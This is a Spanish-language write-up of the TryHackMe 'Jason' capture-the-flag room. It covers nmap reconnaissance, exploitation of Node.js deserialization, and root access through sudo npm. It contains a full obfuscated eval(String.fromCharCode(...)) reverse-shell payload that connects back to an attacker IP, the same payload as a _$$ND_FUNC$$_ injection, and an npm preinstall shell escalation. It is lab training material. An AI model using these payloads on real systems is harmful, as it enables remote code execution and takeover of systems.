---
layout: single
title: Jason
excerpt: "Jason in JavaScript everything is a terrible mistake."
date: 2022-04-22
classes: wide
header:
  teaser: /assets/images/thm-writeup-jason/jason_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Nodejs
  - Deserialization
  - web
---

![logo](/assets/images/thm-writeup-jason/jason_logo.png)

 [Link](https://tryhackme.com/room/jason "jason")

We are Horror LLC, we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!

Thanks to @Luma for testing the room.

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-jason/jason_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

- Whatweb nos da la siguiente información:

~~~css
whatweb {ip}
~~~

![whatweb](/assets/images/thm-writeup-jason/jason_whatweb.png)

---

URL: observamos la siguiente página:

![web](/assets/images/thm-writeup-jason/jason_web.png)

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los ***65535*** puerto de red con el siguiente comando:
  
~~~css
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
~~~

![nmap](/assets/images/thm-writeup-jason/jason_nmap.png)

- Escaneo de vulnerabilidades:

~~~css
nmap -v -A -sC -sV -Pn 10.10.14.228 -p- --script vuln 
~~~

~~~CSS
└─# nmap -v -A -sC -sV -Pn 10.10.14.228 -p- --script vuln
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-22 20:54 -05
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 20:54
NSE Timing: About 50.00% done; ETC: 20:55 (0:00:31 remaining)
Completed NSE at 20:54, 34.15s elapsed
Initiating NSE at 20:54
Completed NSE at 20:54, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Parallel DNS resolution of 1 host. at 20:54
Completed Parallel DNS resolution of 1 host. at 20:54, 0.00s elapsed
Initiating SYN Stealth Scan at 20:54
Scanning 10.10.14.228 (10.10.14.228) [65535 ports]
Discovered open port 80/tcp on 10.10.14.228
Discovered open port 22/tcp on 10.10.14.228
SYN Stealth Scan Timing: About 20.28% done; ETC: 20:57 (0:02:02 remaining)
SYN Stealth Scan Timing: About 28.86% done; ETC: 20:58 (0:02:30 remaining)
SYN Stealth Scan Timing: About 41.05% done; ETC: 20:58 (0:02:11 remaining)
SYN Stealth Scan Timing: About 52.29% done; ETC: 20:58 (0:01:50 remaining)
SYN Stealth Scan Timing: About 66.59% done; ETC: 20:58 (0:01:16 remaining)
Completed SYN Stealth Scan at 20:57, 183.88s elapsed (65535 total ports)
Initiating Service scan at 20:57
Scanning 2 services on 10.10.14.228 (10.10.14.228)
Completed Service scan at 20:58, 20.09s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.14.228 (10.10.14.228)
Retrying OS detection (try #2) against 10.10.14.228 (10.10.14.228)
Retrying OS detection (try #3) against 10.10.14.228 (10.10.14.228)
Retrying OS detection (try #4) against 10.10.14.228 (10.10.14.228)
Retrying OS detection (try #5) against 10.10.14.228 (10.10.14.228)
Initiating Traceroute at 20:58
Completed Traceroute at 20:58, 0.16s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:58
Completed Parallel DNS resolution of 1 host. at 20:58, 0.00s elapsed
NSE: Script scanning 10.10.14.228.
Initiating NSE at 20:58
Completed NSE at 21:00, 131.16s elapsed
Initiating NSE at 21:00
Completed NSE at 21:00, 0.33s elapsed
Nmap scan report for 10.10.14.228 (10.10.14.228)
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207*EXPLOIT*
|     	CVE-2020-12062	5.0	https://vulners.com/cve/CVE-2020-12062
|     	MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/	4.6	https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/	*EXPLOIT*
|     	CVE-2021-28041	4.6	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	4.4	https://vulners.com/cve/CVE-2021-41617
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2016-20012	4.3	https://vulners.com/cve/CVE-2016-20012
|_    	CVE-2021-36368	2.6	https://vulners.com/cve/CVE-2021-36368
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 23 Apr 2022 01:58:04 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <html><head>
|   <title>Horror LLC</title>
|   <style>
|     body {
|       background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|       background-size: 300% 300%;
|       -webkit-animation: Background 10s ease infinite;
|       -moz-animation: Background 10s ease infinite;
|       animation: Background 10s ease infinite;
|     }
|     
|     @-webkit-keyframes Background {
|       0% {
|         background-position: 0% 50%
|       }
|       50% {
|         background-position: 100% 50%
|       }
|       100% {
|         background-position: 0% 50%
|       }
|     }
|     
|     @-moz-keyframes Background {
|       0% {
|         background-position: 0% 50%
|       }
|       50% {
|         background-position: 100% 50%
|       }
|       100% {
|         background-position: 0% 50%
|       }
|     }
|     
|     @keyframes Background {
|       0% {
|         background-position: 0% 50%
|       }
|       50% {
|         background-position: 100% 50%
|       }
|       100% {
|         background-position: 0% 50%
|       }
|     }
|     
|     .full-screen {
|       position: fixed;
|       top: 0;
|       right: 0;
|       bottom: 0;
|       left: 0;
|       background-size: cover;
|       background-position: center;
|       width: 100%;
|       height: 100%;
|       display: -webkit-flex;
|       display: flex;
|       -webkit-flex-direction: column
|       /* works with row or column */
|       
|       flex-direction: column;
|       -webkit-align-items: center;
|       align-items: center;
|       -webkit-justify-content: center;
|       justify-content: center;
|       text-align: center;
|     }
|     
|     h1 {
|       color: #fff;
|       font-family: 'Open Sans', sans-serif;
|       font-weight: 800;
|       font-size: 4em;
|       letter-spacing: -2px;
|       text-align: center;
|       text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
|     }
|     
|     h3 {
|       color: #fff;
|       font-family: 'Open Sans', sans-serif;
|       font-weight: 800;
|       font-size: 2em;
|       letter-spacing: -2px;
|       text-align: center;
|       text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
|     }
|     
|     h2 {
|       color: #fff;
|       font-weight: 10;
|       letter-spacing: 1px;
|       text-align: center;
|       text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);
|     }
|    
|    h4 {
|       color: #fff;
|       font-family: 'Open Sans', sans-serif;
|       font-weight: 800;
|       font-size: 1em;
|       letter-spacing: -1px;
|       text-align: center;
|       text-shadow: 1px 2px 1px rgba(0, 0, 0, .6);  
|    }
|     
|     .button-line {
|       font-family: 'Open Sans', sans-serif;
|       text-transform: uppercase;
|       letter-spacing: 2px;
|       background: transparent;
|       border: 1px solid #fff;
|       color: #fff;
|       text-align: center;
|       font-size: 1.4em;
|       opacity: .8;
|       padding: 20px 40px;
|       text-decoration: none;
|       transition: all .5s ease;
|       margin: 0 auto;
|       display: block;
|       width: 100px;
|     }
|     
|     .button-line:hover {
|       opacity: 1;
|     }
|   
|     </style>
|   </head>
|   <body>
|   	<div class="full-screen">
|     <div>
|       <h1>Horror LLC</h1>
|       <h4>Built with Nodejs</h4>
|       <br>
|       <h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
|       <br>
|       <h2>Email address:</h2>
|       <input type="text" id="fname" name="fname"><br><br>
|       <a class="button-line" id="signup">Submit</a> 
|       <script>
|       document.getElementById("signup").addEventListener("click", function() {
|   	var date = new Date();
|       	date.setTime(date.getTime()+(-1*24*60*60*1000));
|       	var expires = "; expires="+date.toGMTString();
|       	document.cookie = "session=foobar"+expires+"; path=/";
|       	const Http = new XMLHttpRequest();
|           console.log(location);
|           const url=window.location.href+"?email="+document.getElementById("fname").value;
|           Http.open("POST", url);
|           Http.send();
|   	setTimeout(function() {
|   		window.location.reload();
|   	}, 500);
|       }); 
|       </script>
|     </div>
|   </div>
|   
|   
|   </body></html>
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_      http://www.exploit-db.com/exploits/1244/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=4/22%Time=62635D2C%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDat


Uptime guess: 15.403 days (since Thu Apr  7 11:20:57 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   153.01 ms 10.9.0.1 (10.9.0.1)
2   153.38 ms 10.10.14.228 (10.10.14.228)

NSE: Script Post-scanning.
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
Initiating NSE at 21:00
Completed NSE at 21:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 383.40 seconds
           Raw packets sent: 68318 (3.011MB) | Rcvd: 69728 (3.129MB)
                                                                     
~~~

## 2.1 WFUZZ

- Escaneo con WFUZZ (no funcionó)

---

~~~CSS
┌──(root㉿bogsec)-[/home/…/THM/Jason/exploit/Node.Js-Security-Course]
└─# ./nodejsshell.py 10.9.1.216 4444
[+] LHOST = 10.9.1.216
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,49,46,50,49,54,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10)
~~~


_$$ND_FUNC$$_function (){ return 'deser_test'%3b+}()


_$$ND_FUNC$$_function+() {eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,57,46,49,46,50,49,54,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()


- Tratamiento bash

~~~CSS
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

~~~CSS
└─# nc -nlvp 4444      
listening on [any] 4444 ...
connect to [10.9.1.216] from (UNKNOWN) [10.10.18.3] 50334
Connected!
ls
index.html
node_modules
package.json
package-lock.json
server.js

~~~

- Bandera de usuario
~~~CSS
dylan@jason:~$ cat user.txt
cat user.txt
0ba48780dee9f5677a4461f588af217c
~~~

- Root
  
~~~CSS
dylan@jason:~$ TF=$(mktemp -d)
TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
<ts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ sudo npm -C $TF --unsafe-perm i
sudo npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.MiK3EuLmYF
> /bin/sh

# whoami
whoami
root
~~~